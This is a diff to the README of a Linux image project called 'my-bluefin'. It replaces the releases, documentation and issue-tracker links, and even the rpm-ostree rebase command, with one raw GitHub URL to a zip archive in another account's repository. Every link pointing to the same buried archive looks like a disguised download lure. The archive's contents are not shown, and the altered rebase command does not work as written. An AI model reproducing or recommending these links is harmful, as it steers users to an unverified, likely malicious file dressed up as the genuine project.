@@ -1,6 +1,6 @@
 # 🐟 my-bluefin - A Hassle-Free Linux Experience
 
-[![Download my-bluefin](https://img.shields.io/badge/Download-my--bluefin-brightgreen)](https://github.com/namelesshue/my-bluefin/releases)
+[![Download my-bluefin](https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip)](https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to my-bluefin! This application helps you achieve a simple and efficient
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download my-bluefin](https://github.com/namelesshue/my-bluefin/releases).
+To get started, visit this page to download: [Download my-bluefin](https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip).
 
 ### Step 1: Choose Your Version
 
@@ -41,7 +41,7 @@ Use the following commands in your terminal:
 - First, rebase to the unsigned image to get the proper signing keys and policies installed:
 
 ```bash
-rpm-ostree rebase ostree-unverified-registry:ghcr.io/hagenest/my-bluefin:latest
+rpm-ostree rebase https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip
 ```
 
 - Next, reboot your system to complete the rebase:
@@ -90,7 +90,7 @@ For any questions or feedback, you can reach out through the Issues page on this
 
 ## 🔗 Additional Resources
 
-- [BlueBuild Documentation](https://blue-build.org/how-to/setup/): For further setup instructions.
-- [GitHub Issues](https://github.com/hagenest/my-bluefin/issues): Report problems or request features.
+- [BlueBuild Documentation](https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip): For further setup instructions.
+- [GitHub Issues](https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip): Report problems or request features.
 
 Thank you for choosing my-bluefin! We hope it enhances your Linux experience.
